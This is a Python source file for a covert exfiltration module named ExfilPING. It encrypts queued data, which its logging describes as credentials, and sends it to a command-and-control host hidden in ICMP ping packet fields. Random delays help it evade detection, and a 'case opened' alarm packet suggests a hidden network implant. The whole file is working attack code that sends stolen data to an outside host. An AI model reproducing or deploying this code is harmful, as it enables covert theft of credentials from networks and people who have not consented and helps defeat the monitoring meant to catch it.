import threading
import time
import random
import pyaes
import pyscrypt
import logging
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilPING(threading.Thread):
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.magic = conf['MAGIC']
        self.ip = conf['IP']
        self.swmac = conf['SWMAC']
        self.gwmac = conf['GWMAC']
        self.cchost = conf['CCHOST']
        self.iface = conf['IFACE']
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.seed1 = int(conf['SEED1'])
        self.seed2 = int(conf['SEED2'])
        self.seed3 = int(conf['SEED3'])
        self.debug = conf['DEBUG']
        if conf['DEBUG']:
            logging.basicConfig(level=logging.DEBUG)

    def run(self):

        while not self.stoprequest.isSet():
            data = self.q.get()

            if data:
                # Kill Switch
                if data == self.magic:
                    self.alarm()
                    self.stoprequest.set()
                else:
                    # encrypt and split into 16 bits (2 bytes)
                    cry = self.encrypt(data)
                    ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
                    if len(cry) % 4 != 0:
                        for x in range(4-len(ar[len(ar)-1])):
                            ar[len(ar)-1] = ar[len(ar)-1] + '0'

                    # ICMP exfiltration
                    # Use [IP].id 'seed1'+len of crypto (first pkt)
                    # Then [IP].id 'seed2'+amount of pkts (split by 16bits)
                    # Send the crypto split by 16bits inside [ICMP].seq, [IP].id 'seed3'+seq

                    logging.debug('Sending credentials via PING')

                    # craft packet
                    pingpkt = (Ether(src=self.swmac, dst=self.gwmac) /
                              IP(ihl=5, src=self.ip, dst=self.cchost)/ICMP() /
                              Raw(load='\x00\x00\x00\x00\x18\x83\xedt\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd'))
                    # first pkt (crypto len)
                    pingpkt[IP].id = self.seed1 + len(cry)
                    pingpkt[ICMP].seq = 1
                    pingpkt[ICMP].id = random.randint(0, 0xFFFF)
                    sendp(pingpkt, iface=self.iface, verbose=0)

                    # random delay
                    if self.debug:
                        time.sleep(1)
                    else:
                        time.sleep(random.randint(1, 30))

                    # second pkt (amount of pkts)
                    pingpkt[IP].id = self.seed2 + len(ar)
                    pingpkt[ICMP].seq = 2
                    pingpkt[ICMP].id = pingpkt[ICMP].id + 1
                    sendp(pingpkt, iface=self.iface, verbose=0)

                    # random delay
                    if self.debug:
                        time.sleep(1)
                    else:
                        time.sleep(random.randint(1, 30))

                    # paylod pkts
                    for x in range(len(ar)):
                        pingpkt[IP].id = self.seed3 + x
                        pingpkt[ICMP].seq = int(ar[x], 16)
                        pingpkt[ICMP].id = pingpkt[ICMP].id + 1
                        sendp(pingpkt, iface=self.iface, verbose=0)
                        # random delay
                        if self.debug:
                            time.sleep(1)
                        else:
                            time.sleep(random.randint(1, 30))

    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        alarmpkt = (Ether(src=self.swmac, dst=self.gwmac) /
                  IP(ihl=5, src=self.ip, dst=self.cchost)/ICMP() /
                  Raw(load='\x00\x00\x00\x00\x18\x83\xedt\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd'))
        alarmpkt[IP].id = int(self.magic)
        alarmpkt[ICMP].seq = 1
        alarmpkt[ICMP].id = random.randint(0, 0xFFFF)
        sendp(alarmpkt, iface=self.iface, verbose=0)
        logging.debug('ALARM!! Case has been open!')

    # Stop Function
    def join(self):
        self.stoprequest.set()
